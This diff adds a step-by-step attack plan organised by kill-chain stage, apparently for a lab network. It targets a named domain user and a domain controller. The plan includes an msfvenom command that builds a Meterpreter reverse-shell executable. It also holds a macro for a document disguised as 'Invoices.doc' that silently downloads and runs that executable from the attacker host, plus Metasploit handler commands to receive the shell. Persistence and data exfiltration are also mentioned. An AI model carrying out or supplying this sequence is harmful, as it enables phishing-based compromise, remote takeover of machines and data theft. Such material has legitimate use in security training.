@@ -1,0 +1,76 @@
+Attack: 
+
+Reconnaissance 
+
+192.168.3.12 is the domain user’s IP. (Agent name is Davis Black) 
+
+	-Davis Black has a email of blackdavis690@gmail.com 
+
+192.168.3.10 is the domain controller’s IP 
+
+Weaponization 
+
+We are going to use metasploit’s msfvenom to create a malicious payload: 
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > /var/www/html/shell.exe 
+
+-This will make sure the payload is accessible at http://192.168.1.10/shell.exe 
+
+Sudo service apache2 start 
+
+	-Start the HTTP server to host shell.exe 
+
+ 
+
+Open LibreOffice Writer 
+
+Go to Tools > Macros > Edit Macro and input this: 
+ 
+
+“Sub AutoOpen() 
+
+    On Error Resume Next 
+
+    Dim objShell As Object 
+
+    Set objShell = CreateObject("WScript.Shell") 
+
+    objShell.Run "powershell -w hidden -c ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.10/shell.exe', 'C:\\Windows\\Temp\\shell.exe'); Start-Process 'C:\\Windows\\Temp\\shell.exe'""" 
+
+End Sub” 
+
+Save it as a document word macro-enabled document word 2007 VBA named “Invoices.doc” 
+
+ 
+
+Delivery 
+
+Email delivery to the user’s endpoint 
+
+Exploitation 
+
+Word document with malicious macro enabled 
+
+Installation 
+
+Installs a reverse shell connection to the kali linux attacker – shell.exe 
+
+C2 
+
+Receive the incoming connection after payload is delivered 
+
+use exploit/multi/handler 
+
+set payload windows/meterpreter/reverse_tcp 
+
+set LHOST <Kali_IP> 
+
+set LPORT 4444 
+
+exploit 
+
+Attacks on Objective 
+
+Employs persistence mechanisms using registry modifications and bootup folder, and exfiltrate data on windows AD server 
+
+ 
